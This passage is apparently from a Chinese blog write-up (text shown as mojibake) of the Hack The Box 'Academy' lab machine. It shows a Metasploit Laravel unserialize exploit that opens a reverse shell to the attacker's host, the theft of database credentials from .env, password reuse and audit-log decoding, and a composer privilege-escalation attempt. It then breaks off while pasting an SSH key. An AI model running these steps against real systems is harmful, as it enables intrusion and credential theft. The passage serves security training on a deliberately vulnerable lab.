hostsï¼‰"></a>3.è®¿é—®dev-staging-01.academy.htbï¼ˆéœ€æ·»åŠ hostsï¼‰</h3><p><code>å‘ç°æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯ï¼Œåº”ç”¨ä¸ºLaravel</code></p><img src="/2020/12/09/HTB-academy/image-20201209173106569.png" class><h2 id="0x07-Googleæœç´¢Laravel-expè¿›è¡Œåˆ©ç”¨"><a href="#0x07-Googleæœç´¢Laravel-expè¿›è¡Œåˆ©ç”¨" class="headerlink" title="0x07.Googleæœç´¢Laravel expè¿›è¡Œåˆ©ç”¨"></a>0x07.Googleæœç´¢Laravel expè¿›è¡Œåˆ©ç”¨</h2><p><code>å‘ç°å¯ä»¥ä½¿ç”¨MSFè¿›è¡Œåˆ©ç”¨</code></p><img src="/2020/12/09/HTB-academy/image-20201209173353304.png" class><h2 id="0x08-msfåˆ©ç”¨"><a href="#0x08-msfåˆ©ç”¨" class="headerlink" title="0x08.msfåˆ©ç”¨"></a>0x08.msfåˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# msfconsole -q</span><br><span class="line">msf5 &gt; </span><br><span class="line">msf5 &gt; search Laravel</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution</span><br><span class="line"></span><br><span class="line">msf5 &gt; use 0</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; </span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Path to target webapp</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><h3 id="1-è®¾ç½®æœ¬ç«¯ä¸»æœº"><a href="#1-è®¾ç½®æœ¬ç«¯ä¸»æœº" class="headerlink" title="1.è®¾ç½®æœ¬ç«¯ä¸»æœº"></a>1.è®¾ç½®æœ¬ç«¯ä¸»æœº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.17.216  </span><br></pre></td></tr></table></figure><h3 id="2-è®¾ç½®å¯¹ç«¯ä¸»æœº"><a href="#2-è®¾ç½®å¯¹ç«¯ä¸»æœº" class="headerlink" title="2.è®¾ç½®å¯¹ç«¯ä¸»æœº"></a>2.è®¾ç½®å¯¹ç«¯ä¸»æœº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set rhosts academy.htb</span><br><span class="line">rhosts =&gt; academy.htb</span><br></pre></td></tr></table></figure><h3 id="3-è®¾ç½®app-key"><a href="#3-è®¾ç½®app-key" class="headerlink" title="3.è®¾ç½®app_key"></a>3.è®¾ç½®app_key</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">app_key =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= </span><br></pre></td></tr></table></figure><h3 id="4-è®¾ç½®è™šæ‹Ÿä¸»æœº"><a href="#4-è®¾ç½®è™šæ‹Ÿä¸»æœº" class="headerlink" title="4.è®¾ç½®è™šæ‹Ÿä¸»æœº"></a>4.è®¾ç½®è™šæ‹Ÿä¸»æœº</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set vhost dev-staging-01.academy.htb</span><br><span class="line">vhost =&gt; dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure><h3 id="5-exploitå¾—åˆ°shell"><a href="#5-exploitå¾—åˆ°shell" class="headerlink" title="5.exploitå¾—åˆ°shell"></a>5.exploitå¾—åˆ°shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting                               Required  Description</span><br><span class="line">   ----       ---------------                               --------  -----------</span><br><span class="line">   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     academy.htb                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80                                            yes       The target port (TCP)</span><br><span class="line">   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                                             yes       Path to target webapp</span><br><span class="line">   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[*] Command shell session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.215:39152) at 2020-12-09 03:07:26 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">pwd</span><br><span class="line">/var/www/html/htb-academy-dev-01/public</span><br><span class="line">ls</span><br><span class="line">css</span><br><span class="line">favicon.ico</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">robots.txt</span><br><span class="line">web.config</span><br></pre></td></tr></table></figure><h3 id="6-å‡çº§äº¤äº’shell"><a href="#6-å‡çº§äº¤äº’shell" class="headerlink" title="6.å‡çº§äº¤äº’shell"></a>6.å‡çº§äº¤äº’shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ </span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls</span><br><span class="line">ls</span><br><span class="line">css  favicon.ico  index.php  js  robots.txt  web.config</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ../../</span><br><span class="line">cd ../../</span><br></pre></td></tr></table></figure><h3 id="7-æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤mySup3rP4s5w0rd"><a href="#7-æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤mySup3rP4s5w0rd" class="headerlink" title="7.æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤mySup3rP4s5w0rd!!"></a>7.æ‰‹åŠ¨çˆ¬è™«å¾—åˆ°äº†ä¸€ä¸ªå£ä»¤<code>mySup3rP4s5w0rd!!</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/var/www$ pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data@academy:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">academy  htb-academy-dev-01  index.php</span><br><span class="line">www-data@academy:/var/www/html$ cd academy</span><br><span class="line">cd academy</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls</span><br><span class="line">ls</span><br><span class="line">app        composer.json  database      public     routes      tests</span><br><span class="line">artisan    composer.lock  package.json  readme.md  server.php  vendor</span><br><span class="line">bootstrap  config         phpunit.xml   resources  storage     webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 280</span><br><span class="line">drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .</span><br><span class="line">drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env</span><br><span class="line">-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example</span><br><span class="line">-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes</span><br><span class="line">-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore</span><br><span class="line">drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app</span><br><span class="line">-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap</span><br><span class="line">-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json</span><br><span class="line">-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database</span><br><span class="line">-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json</span><br><span class="line">-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:13 public</span><br><span class="line">-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes</span><br><span class="line">-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests</span><br><span class="line">drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor</span><br><span class="line">-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ cat .env</span><br><span class="line">cat .env</span><br><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">APP_DEBUG=false</span><br><span class="line">APP_URL=http://localhost</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=academy</span><br><span class="line">DB_USERNAME=dev</span><br><span class="line">DB_PASSWORD=mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line">BROADCAST_DRIVER=log</span><br><span class="line">CACHE_DRIVER=file</span><br><span class="line">SESSION_DRIVER=file</span><br><span class="line">SESSION_LIFETIME=120</span><br><span class="line">QUEUE_DRIVER=sync</span><br><span class="line"></span><br><span class="line">REDIS_HOST=127.0.0.1</span><br><span class="line">REDIS_PASSWORD=null</span><br><span class="line">REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">MAIL_DRIVER=smtp</span><br><span class="line">MAIL_HOST=smtp.mailtrap.io</span><br><span class="line">MAIL_PORT=2525</span><br><span class="line">MAIL_USERNAME=null</span><br><span class="line">MAIL_PASSWORD=null</span><br><span class="line">MAIL_ENCRYPTION=null</span><br><span class="line"></span><br><span class="line">PUSHER_APP_ID=</span><br><span class="line">PUSHER_APP_KEY=</span><br><span class="line">PUSHER_APP_SECRET=</span><br><span class="line">PUSHER_APP_CLUSTER=mt1</span><br><span class="line"></span><br><span class="line">MIX_PUSHER_APP_KEY=&quot;$&#123;PUSHER_APP_KEY&#125;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER=&quot;$&#123;PUSHER_APP_CLUSTER&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="8-ç»è¿‡å°è¯•å‘ç°cry0l1t3å¯ä»¥ç™»å…¥"><a href="#8-ç»è¿‡å°è¯•å‘ç°cry0l1t3å¯ä»¥ç™»å…¥" class="headerlink" title="8.ç»è¿‡å°è¯•å‘ç°cry0l1t3å¯ä»¥ç™»å…¥"></a>8.ç»è¿‡å°è¯•å‘ç°<code>cry0l1t3</code>å¯ä»¥ç™»å…¥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/var/www/html/academy$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@academy:/home$ ls</span><br><span class="line">ls</span><br><span class="line">21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n</span><br><span class="line">www-data@academy:/home$ su cry0l1t3</span><br><span class="line">su cry0l1t3</span><br><span class="line">Password: mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">/bin/bash</span><br><span class="line">cry0l1t3@academy:/home$ </span><br><span class="line"></span><br><span class="line">cry0l1t3@academy:/home$ cd ~</span><br><span class="line">cd ~</span><br><span class="line">cry0l1t3@academy:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cry0l1t3@academy:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">cry0l1t3@academy:~$ </span><br></pre></td></tr></table></figure><h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><h3 id="1-å°è¯•sudo-lè¿›è¡Œææƒ-éœ¸ç‰¹æ²¡æœ‰"><a href="#1-å°è¯•sudo-lè¿›è¡Œææƒ-éœ¸ç‰¹æ²¡æœ‰" class="headerlink" title="1.å°è¯•sudo -lè¿›è¡Œææƒ ,éœ¸ç‰¹æ²¡æœ‰"></a>1.å°è¯•sudo -lè¿›è¡Œææƒ ,éœ¸ç‰¹æ²¡æœ‰</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:~$ sudo -l</span><br><span class="line">[sudo] password for cry0l1t3: </span><br><span class="line">Sorry, user cry0l1t3 may not run sudo on academy.</span><br><span class="line">cry0l1t3@academy:~$</span><br></pre></td></tr></table></figure><h3 id="2-å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡"><a href="#2-å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡" class="headerlink" title="2.å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡"></a>2.å¯¹SElinuxçš„æ—¥å¿—è¿›è¡Œå®¡è®¡</h3><p><strong><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmdlbnRvby5vcmcvd2lraS9TRUxpbnV4L1R1dG9yaWFscy9XaGVyZV90b19maW5kX1NFTGludXhfcGVybWlzc2lvbl9kZW5pYWxfZGV0YWlscyM6fjp0ZXh0PVNFTGludXglMjBsb2dnaW5nLC1UaGUlMjBtb3N0JTIwaW1wb3J0YW50JnRleHQ9VGhlJTIwZGVmYXVsdCUyMGxvY2F0aW9uJTIwd2hlcmUlMjB5b3UsJTJGdmFyJTJGbG9nJTJGYXVkaXQu">å‚è€ƒæ–‡çŒ®<i class="fa fa-external-link-alt"></i></span></strong></p><p><code>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç”¨æˆ·è¿›è¡Œè¿‡su</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ cat * | grep &#x27;comm=&quot;su&quot;&#x27;</span><br><span class="line">type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A</span><br><span class="line">cry0l1t3@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><p><code>è§£ç hex</code></p><blockquote><p>å¯†æ–‡ï¼š6D7262336E5F41634064336D79210A</p><p>åŸæ–‡ï¼šmrb3n_Ac@d3my!</p></blockquote><p><code>æ ¹æ®å¯†ç å¯ä»¥æ¨æµ‹ä¸ºmrb3nçš„å¯†ç </code></p><h3 id="3-mrb3nç™»å…¥"><a href="#3-mrb3nç™»å…¥" class="headerlink" title="3.mrb3nç™»å…¥"></a>3.mrb3nç™»å…¥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ su mrb3n</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><p><code>sudo -lææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ sudo -l</span><br><span class="line">[sudo] password for mrb3n:  </span><br><span class="line">Matching Defaults entries for mrb3n on academy:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User mrb3n may run the following commands on academy:</span><br><span class="line">    (ALL) /usr/bin/composer</span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><h3 id="4-composerææƒ"><a href="#4-composerææƒ" class="headerlink" title="4.composerææƒ"></a>4.composerææƒ</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY29tcG9zZXIv">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>ç›´æ¥è¿›è¡Œåˆ©ç”¨éœ¸ç‰¹å¤±è´¥äº†ğŸ™ƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:/var/log/audit$ echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;$TF/composer.json</span><br><span class="line">mrb3n@academy:/var/log/audit$ composer --working-dir=$TF run-script x</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">mrb3n</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p><code>æ›´æ¢æ€è·¯ï¼Œåˆ©ç”¨sshå…¬é’¥è¿›è¡Œææƒ</code></p><blockquote><p>é¦–å…ˆä½¿ç”¨ssh-keygenç”Ÿæˆå…¬é’¥ä¸ç§é’¥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# ssh-keygen </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:FKBkE5JZ5qaTiSzGFeu24nBc+9uHrMC4EI1Q6/gOXnc root@JIYE</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|  o=B....        |</span><br><span class="line">| .oBoo   .       |</span><br><span class="line">|. .o+   .        |</span><br><span class="line">|+*o=   .         |</span><br><span class="line">|*+Bo.   S        |</span><br><span class="line">|o+.=..           |</span><br><span class="line">|+.=o+. E .       |</span><br><span class="line">|+=o..o..o .      |</span><br><span class="line">| oo   +o..       |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@JIYE:~# cd .ssh/</span><br><span class="line">root@JIYE:~/.ssh# ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">.pubä¸ºå…¬é’¥</span><br><span class="line">root@JIYE:~/.ssh# cat id_rsa.pub </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc= 